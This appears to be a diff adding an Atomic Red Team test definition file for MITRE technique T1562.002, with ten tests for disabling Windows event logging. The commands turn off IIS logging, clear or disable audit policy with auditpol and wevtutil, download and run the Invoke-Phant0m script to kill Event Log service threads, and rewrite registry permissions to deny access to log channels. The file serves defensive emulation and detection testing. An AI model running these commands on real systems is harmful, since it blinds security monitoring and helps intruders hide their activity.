@@ -1,0 +1,206 @@
+{
+  "attack_technique": "T1562.002",
+  "display_name": "Impair Defenses: Disable Windows Event Logging",
+  "atomic_tests": [
+    {
+      "name": "Disable Windows IIS HTTP Logging",
+      "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true",
+        "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}"
+      },
+      "input_arguments": {
+        "website_name": {
+          "description": "The name of the website on a server",
+          "type": "string",
+          "default": "Default Web Site"
+        }
+      },
+      "auto_generated_guid": "69435dcf-c66f-4ec0-a8b1-82beb76b34db"
+    },
+    {
+      "name": "Disable Windows IIS HTTP Logging via PowerShell",
+      "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\#{website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true",
+        "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}"
+      },
+      "input_arguments": {
+        "website_name": {
+          "description": "The name of the website on a server",
+          "type": "string",
+          "default": "Default Web Site"
+        }
+      },
+      "auto_generated_guid": "a957fb0f-1e85-49b2-a211-413366784b1e"
+    },
+    {
+      "name": "Kill Event Log Service Threads",
+      "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m",
+        "cleanup_command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "41ac52ba-5d5e-40c0-b267-573ed90489bd"
+    },
+    {
+      "name": "Impair Windows Audit Log Policy",
+      "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable",
+        "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "5102a3a7-e2d7-4129-9e45-f483f2e0eea8"
+    },
+    {
+      "name": "Clear Windows Audit Policy Config",
+      "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "command": "auditpol /clear /y\nauditpol /remove /allusers",
+        "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "913c0e4e-4b37-4b78-ad0b-90e7b25010f6"
+    },
+    {
+      "name": "Disable Event Logging with wevtutil",
+      "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "wevtutil sl \"#{log_name}\" /e:false",
+        "cleanup_command": "wevtutil sl \"#{log_name}\" /e:true"
+      },
+      "input_arguments": {
+        "log_name": {
+          "description": "Name of the log to be disabled",
+          "type": "string",
+          "default": "Microsoft-Windows-IKE/Operational"
+        }
+      },
+      "auto_generated_guid": "b26a3340-dad7-4360-9176-706269c74103"
+    },
+    {
+      "name": "Makes Eventlog blind with Phant0m",
+      "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "\"#{file_name}\"",
+        "cleanup_command": "echo \"Sorry you have to reboot\""
+      },
+      "input_arguments": {
+        "file_name": {
+          "description": "exe version of Phant0m",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Phant0m.exe must exist on disk at specified location (#{file_name})",
+          "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe\" -OutFile \"#{file_name}\" -UseBasicParsing"
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741"
+    },
+    {
+      "name": "Modify Event Log Channel Access Permissions via Registry - PowerShell",
+      "description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
+        "cleanup_command": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore"
+      },
+      "input_arguments": {
+        "ChannelPath": {
+          "description": "Path to the event log service channel to alter",
+          "type": "string",
+          "default": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-TaskScheduler/Operational"
+        }
+      },
+      "auto_generated_guid": "8e81d090-0cd6-4d46-863c-eec11311298f"
+    },
+    {
+      "name": "Modify Event Log Channel Access Permissions via Registry 2 - PowerShell",
+      "description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "New-Item -Path #{ChannelPath} -Force\nSet-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
+        "cleanup_command": "Remove-Item -Path #{ChannelPath} -Force\nRestart-Service -Name EventLog -Force -ErrorAction Ignore"
+      },
+      "input_arguments": {
+        "ChannelPath": {
+          "description": "Path to the event log service channel to alter",
+          "type": "string",
+          "default": "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\Setup"
+        }
+      },
+      "auto_generated_guid": "85e6eff8-3ed4-4e03-ae50-aa6a404898a5"
+    },
+    {
+      "name": "Modify Event Log Access Permissions via Registry - PowerShell",
+      "description": "This test simulates an adversary modifying access permissions for a Windows Event Log channel by setting the \"CustomSD\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "Set-ItemProperty -Path #{CustomSDPath} -Name \"CustomSD\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"",
+        "cleanup_command": "Remove-ItemProperty -Path #{CustomSDPath} -Name \"CustomSD\""
+      },
+      "input_arguments": {
+        "CustomSDPath": {
+          "description": "Path to the event log service channel to alter",
+          "type": "string",
+          "default": "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\System"
+        }
+      },
+      "auto_generated_guid": "a0cb81f8-44d0-4ac4-a8f3-c5c7f43a12c1"
+    }
+  ]
+}
